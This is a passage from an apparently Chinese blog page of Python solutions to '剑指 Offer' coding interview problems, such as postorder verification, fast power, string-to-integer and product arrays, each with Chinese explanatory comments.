class="comment">#减去区间之前的那些数</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        此时得到的i如果是3，则说明从三位数开始</span></span><br><span class="line"><span class="string">        可以得到区间在100-1000之间</span></span><br><span class="line"><span class="string">        从而算得起始的数是10**(3-1)=100</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        start_num = <span class="number">10</span>**(i<span class="number">-1</span>)</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        因为在这个区间每一个数都是i位，因此我们得到除数div</span></span><br><span class="line"><span class="string">        对于三位数来讲，如果除数div=10，则可以得到数字是在100+10-1=109附近</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        div = res / i</span><br><span class="line">        mod = res % i</span><br><span class="line">        new_num = start_num + div - <span class="number">1</span> <span class="comment">#这个数字就是区间内加上除数之后的数字</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        进一步通过余数判断，如果余数为0，则说明当前得到的数字的最后一个数字就是结果</span></span><br><span class="line"><span class="string">        如果余数不为0，则说明最终结果在下一个数字，从而根据余数得到最终结果</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> mod == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> int(str(new_num)[<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> int(str(new_num+<span class="number">1</span>)[mod - i - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#第一种方法，超时了</span></span><br><span class="line">        <span class="comment"># s=0</span></span><br><span class="line">        <span class="comment"># for i in range(n+1):</span></span><br><span class="line">        <span class="comment">#     s+=len(str(i))</span></span><br><span class="line">        <span class="comment">#     if s&gt;=n+1:</span></span><br><span class="line">        <span class="comment">#         return int(str(i)[n-temp])</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-33-二叉搜索树的后序遍历序列-medium"><a href="#剑指-Offer-33-二叉搜索树的后序遍历序列-medium" class="headerlink" title="剑指 Offer 33. 二叉搜索树的后序遍历序列(medium)"></a>剑指 Offer 33. 二叉搜索树的后序遍历序列(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verifyPostorder</span><span class="params">(self, postorder)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type postorder: List[int]</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(postorder) == <span class="number">1</span> <span class="keyword">or</span> (<span class="keyword">not</span> postorder):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        root = postorder[<span class="number">-1</span>] <span class="comment">#后序遍历最后一个值为根结点</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(postorder)): <span class="comment">#找到根节点右子树的第一个值</span></span><br><span class="line">            <span class="keyword">if</span> postorder[i]&gt;=root:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        left = postorder[:i] <span class="comment">#划分左子树</span></span><br><span class="line">        right = postorder[i:len(postorder)<span class="number">-1</span>] <span class="comment">#划分右子树</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> left: <span class="comment">#如果左子树中有小于根的，直接return </span></span><br><span class="line">            <span class="keyword">if</span> i&gt;root:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> right: <span class="comment">#如果右子树中有小于根的，直接return </span></span><br><span class="line">            <span class="keyword">if</span> i&lt;root:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        left = self.verifyPostorder(left) <span class="comment">#递归判断左子树</span></span><br><span class="line">        right = self.verifyPostorder(right) <span class="comment">#递归判断右子树</span></span><br><span class="line">        <span class="keyword">if</span> left <span class="keyword">and</span> right:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-16-数值的整数次方-medium"><a href="#剑指-Offer-16-数值的整数次方-medium" class="headerlink" title="剑指 Offer 16. 数值的整数次方(medium)"></a>剑指 Offer 16. 数值的整数次方(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">myPow</span><span class="params">(self, x, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type x: float</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: float</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> n==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>/x * self.myPow(<span class="number">1</span>/x,-n<span class="number">-1</span>) </span><br><span class="line">        <span class="keyword">if</span> n%<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> x * self.myPow(x*x,n/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> n%<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> self.myPow(x*x,n/<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-67-把字符串转换成整数-medium"><a href="#剑指-Offer-67-把字符串转换成整数-medium" class="headerlink" title="剑指 Offer 67. 把字符串转换成整数(medium)"></a>剑指 Offer 67. 把字符串转换成整数(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">strToInt</span><span class="params">(self, str)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type str: str</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        str = list(str.lstrip())  <span class="comment"># 去掉开头多余的空格</span></span><br><span class="line">        num = [<span class="string">'0'</span>, <span class="string">'1'</span>,<span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>]</span><br><span class="line">        <span class="keyword">if</span> len(str)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> len(str)==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> str[<span class="number">0</span>] <span class="keyword">in</span> num:</span><br><span class="line">                <span class="keyword">return</span> int(str[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; len(str):</span><br><span class="line">            <span class="keyword">if</span> str[i] != <span class="string">"-"</span> <span class="keyword">and</span> str[i] != <span class="string">"+"</span> <span class="keyword">and</span> str[i] <span class="keyword">not</span> <span class="keyword">in</span> num:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> str[i] == <span class="string">'-'</span> <span class="keyword">or</span> str[i] == <span class="string">'+'</span>: <span class="comment">#处理以‘-’和‘+’开头的</span></span><br><span class="line">                temp=str[i] <span class="comment">#保存‘+-’符号</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> str[i] <span class="keyword">not</span> <span class="keyword">in</span> num:</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">while</span> i &lt; len(str):</span><br><span class="line">                        <span class="keyword">if</span> str[i] <span class="keyword">in</span> num:</span><br><span class="line">                            res *= <span class="number">10</span></span><br><span class="line">                            res += int(str[i])</span><br><span class="line">                            i += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">else</span>: <span class="comment">#如果第i个字符不是数字直接退出</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> temp == <span class="string">'-'</span>:</span><br><span class="line">                        <span class="keyword">if</span> res&gt;pow(<span class="number">2</span>,<span class="number">31</span>):</span><br><span class="line">                            <span class="keyword">return</span> -pow(<span class="number">2</span>,<span class="number">31</span>)</span><br><span class="line">                        <span class="keyword">return</span> -res</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> res&gt;pow(<span class="number">2</span>,<span class="number">31</span>)<span class="number">-1</span>:</span><br><span class="line">                            <span class="keyword">return</span> pow(<span class="number">2</span>,<span class="number">31</span>)<span class="number">-1</span></span><br><span class="line">                        <span class="keyword">return</span> res</span><br><span class="line">            <span class="keyword">elif</span> str[i] <span class="keyword">in</span> num: <span class="comment">#处理以字母开头的</span></span><br><span class="line">                <span class="keyword">while</span> i &lt; len(str):</span><br><span class="line">                        <span class="keyword">if</span> str[i] <span class="keyword">in</span> num:</span><br><span class="line">                            res *= <span class="number">10</span></span><br><span class="line">                            res += int(str[i])</span><br><span class="line">                            i += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> res&gt;pow(<span class="number">2</span>,<span class="number">31</span>)<span class="number">-1</span>:</span><br><span class="line">                    <span class="keyword">return</span> pow(<span class="number">2</span>,<span class="number">31</span>)<span class="number">-1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-46-把数字翻译成字符串-medium"><a href="#剑指-Offer-46-把数字翻译成字符串-medium" class="headerlink" title="剑指 Offer 46. 把数字翻译成字符串(medium)"></a>剑指 Offer 46. 把数字翻译成字符串(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">translateNum</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type num: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> num%<span class="number">100</span>&lt;<span class="number">10</span> <span class="keyword">or</span> num%<span class="number">100</span>&gt;<span class="number">25</span>:</span><br><span class="line">            <span class="keyword">return</span> self.translateNum(num/<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> (self.translateNum(num/<span class="number">10</span>)+self.translateNum(num/<span class="number">100</span>))</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-14-II-剪绳子-II-medium"><a href="#剑指-Offer-14-II-剪绳子-II-medium" class="headerlink" title="剑指 Offer 14- II. 剪绳子 II(medium)"></a>剑指 Offer 14- II. 剪绳子 II(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cuttingRope</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        尽可能分成长度为3的</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> n&lt;=<span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> n<span class="number">-1</span></span><br><span class="line">        res = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> n&gt;<span class="number">4</span>:</span><br><span class="line">            res*=<span class="number">3</span></span><br><span class="line">            n-=<span class="number">3</span></span><br><span class="line">        <span class="keyword">return</span> (res*n)% <span class="number">1000000007</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-66-构建乘积数组-medium"><a href="#剑指-Offer-66-构建乘积数组-medium" class="headerlink" title="剑指 Offer 66. 构建乘积数组(medium)"></a>剑指 Offer 66. 构建乘积数组(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">constructArr</span><span class="params">(self, a)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type a: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        从前向后累乘一次并保存结果，从后向前累乘一次并保存结果</span></span><br><span class="line"><span class="string">        就[1,2,3,4,5]而言</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(a)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res1 = [] </span><br><span class="line">        res2 = []</span><br><span class="line">        result = []</span><br><span class="line">        m = <span class="number">1</span></span><br><span class="line">        n = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> a[:<span class="number">-1</span>]: <span class="comment">#从前向后乘只计算到倒数第二个数</span></span><br><span class="line">            m*=i</span><br><span class="line">            res1.append(m) <span class="comment">#res1中保存[1,1*2,1*2*3,1*2*3*4]</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> a[::<span class="number">-1</span>][:<span class="number">-1</span>]: <span class="comment">#从后向前乘只计算到第二个数</span></span><br><span class="line">            n*=i</span><br><span class="line">            res2.append(n) <span class="comment">#res2中保存[5,5*4,5*4*3,5*4*3*2]</span></span><br><span class="line">        res2 = res2[::<span class="number">-1</span>] <span class="comment">#反转后得[5*4*3*2,5*4*3,5*4,5]</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        此时res1 = [1,1*2,1*2*3,1*2*3*4]</span></span><br><span class="line"><span class="string">            res2 = [5*4*3*2,5*4*3,5*4,5]</span></span><br><span class="line"><span class="string">        我们可以得到当缺失第一个数时，值为res2[0]</span></span><br><span class="line"><span class="string">        当缺失最后一个数时，值为res1[-1]</span></span><br><span class="line"><span class="string">        从缺失第二个数到倒数第二个数</span></span><br><span class="line"><span class="string">        我们可以得到值为res[i]*res[i-1]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(res2)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                result.append(res2[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">elif</span> i == len(res2):</span><br><span class="line">                result.append(res1[<span class="number">-1</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result.append(res2[i]*res1[i<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-63-股票的最大利润-medium"><a href="#剑指-Offer-63-股票的最大利润-medium" class="headerlink" title="剑指 Offer 63. 股票的最大利润(medium)"></a>剑指 Offer 63. 股票的最大利润(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span><span class="params">(self, prices)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type prices: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        max_num=<span class="number">0</span> <span class="comment">#记录当前股票最大差值</span></span><br><span class="line">        <span class="keyword">if</span> len(prices)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        min_num=prices[<span class="number">0</span>] <span class="comment">#将第一天的股票作为最小的值</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(prices)):</span><br><span class="line">            min_num = min(min_num,prices[i<span class="number">-1</span>]) <span class="comment">#判断当天和当前最小值中的最小值</span></span><br><span class="line">            <span class="keyword">if</span> prices[i]-min_num&gt;max_num: <span class="comment">#如果当天的股票减去之前的股票最小值大于最大差值</span></span><br><span class="line">                max_num = prices[i]-min_num <span class="comment">#则替换最大差值</span></span><br><span class="line">        <span class="keyword">return</span> max_num</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-36-二叉搜索树与双向链表-medium"><a href="#剑指-Offer-36-二叉搜索树与双向链表-medium" class="headerlink" title="剑指 Offer 36. 二叉搜索树与双向链表(medium)"></a>剑指 Offer 36. 二叉搜索树与双向链表(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"># Definition for a Node.</span></span><br><span class="line"><span class="string">class Node(object):</span></span><br><span class="line"><span class="string">    def __init__(self, val, left=None, right=None):</span></span><br><span class="line"><span class="string">        self.val = val</span></span><br><span class="line"><span class="string">        self.left = left</span></span><br><span class="line"><span class="string">        self.right = right</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    head = <span class="literal">None</span></span><br><span class="line">    tail = <span class="literal">None</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">treeToDoublyList</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type root: Node</span></span><br><span class="line"><span class="string">        :rtype: Node</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> root == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        self.pre(root) <span class="comment">#中序遍历</span></span><br><span class="line">        self.head.left = self.tail <span class="comment">#头节点前驱指向尾节点</span></span><br><span class="line">        self.tail.right = self.head <span class="comment">#尾节点后驱指向头节点</span></span><br><span class="line">        <span class="keyword">return</span> self.head</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pre</span><span class="params">(self,root)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> root == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.pre(root.left)</span><br><span class="line">        <span class="keyword">if</span>(self.head == <span class="literal">None</span>):</span><br><span class="line">            self.head = self.tail = root</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.tail.right = root</span><br><span class="line">            root.left = self.tail</span><br><span class="line">            self.tail = root</span><br><span class="line">        self.pre(root.right)</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-31-栈的压入、弹出序列-medium"><a href="#剑指-Offer-31-栈的压入、弹出序列-medium" class="headerlink" title="剑指 Offer 31. 栈的压入、弹出序列(medium)"></a>剑指 Offer 31. 栈的压入、弹出序列(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validateStackSequences</span><span class="params">(self, pushed, popped)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type pushed: List[int]</span></span><br><span class="line"><span class="string">        :type popped: List[int]</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        s = [] <span class="comment">#初始化一个栈</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> popped:</span><br><span class="line">            <span class="comment">#得到每一个pop出去的数字在push数组中的下标</span></span><br><span class="line">            <span class="comment">#加一为了方便后续对s栈进行插入操作，即这里res-1才是真正的下标</span></span><br><span class="line">            res = pushed.index(i)+<span class="number">1</span></span><br><span class="line">            <span class="comment">#如果当前pop出去的数在push数组的下标大于s栈的长度</span></span><br><span class="line">            <span class="comment">#则需要将下标数字之前的数字都写入s栈中</span></span><br><span class="line">            <span class="keyword">if</span> res &gt; len(s):</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(len(s),res):</span><br><span class="line">                    s.append(k)</span><br><span class="line">                <span class="comment">#这一步对pop出去的下标置为-1</span></span><br><span class="line">                s[res<span class="number">-1</span>] = <span class="number">-1</span></span><br><span class="line">            <span class="comment">#如果当前pop出去的数在push数组的下标小于s栈的长度</span></span><br><span class="line">            <span class="comment">#则我们只需要判断在s栈中对于res下标之后的数值是否为-1即可</span></span><br><span class="line">            <span class="keyword">elif</span> res &lt; len(s):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> range(res,len(s)):</span><br><span class="line">                    <span class="comment">#如果在res下标之后存在不为-1的下标，则直接返回false</span></span><br><span class="line">                    <span class="keyword">if</span> s[j] != <span class="number">-1</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line">                <span class="comment">#如果res下标之后存在s栈中的都是-1</span></span><br><span class="line">                <span class="comment">#则对当前下标进行置为-1操作</span></span><br><span class="line">                s[res<span class="number">-1</span>] = <span class="number">-1</span></span><br><span class="line">        <span class="comment">#循环结束的话返回True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-35-复杂链表的复制-medium"><a href="#剑指-Offer-35-复杂链表的复制-medium" class="headerlink" title="剑指 Offer 35. 复杂链表的复制(medium)"></a>剑指 Offer 35. 复杂链表的复制(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"># Definition for a Node.</span></span><br><span class="line"><span class="string">class Node:</span></span><br><span class="line"><span class="string">    def __init__(self, x, next=None, random=None):</span></span><br><span class="line"><span class="string">        self.val = int(x)</span></span><br><span class="line"><span class="string">        self.next = next</span></span><br><span class="line"><span class="string">        self.random = random</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">copyRandomList</span><span class="params">(self, head)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: Node</span></span><br><span class="line"><span class="string">        :rtype: Node</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> head == <span class="literal">None</span>:</span><br><span class="line">            <span 